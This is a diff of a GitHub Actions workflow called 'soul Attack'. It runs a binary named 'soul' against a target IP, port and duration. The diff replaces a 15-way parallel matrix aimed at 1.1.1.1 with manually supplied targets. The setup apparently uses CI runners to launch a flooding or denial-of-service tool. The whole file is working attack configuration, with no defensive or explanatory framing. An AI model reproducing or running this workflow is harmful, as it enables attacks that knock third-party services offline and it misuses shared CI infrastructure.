@@ -1,14 +1,24 @@
 name: soul Attack
-on: [push]
+
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+    inputs:
+      ip:
+        required: true
+      port:
+        required: true
+      time:
+        required: true
 
 jobs:
   soul:
     runs-on: ubuntu-22.04
-    strategy:
-      matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
     steps:
-    - uses: actions/checkout@v3
-    - run: chmod +x soul
-    - run: sudo ./soul 1.1.1.1 1 1
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul ${{ inputs.ip || '1.1.1.1' }} \
+                    ${{ inputs.port || '80' }} \
+                    ${{ inputs.time || '60' }}
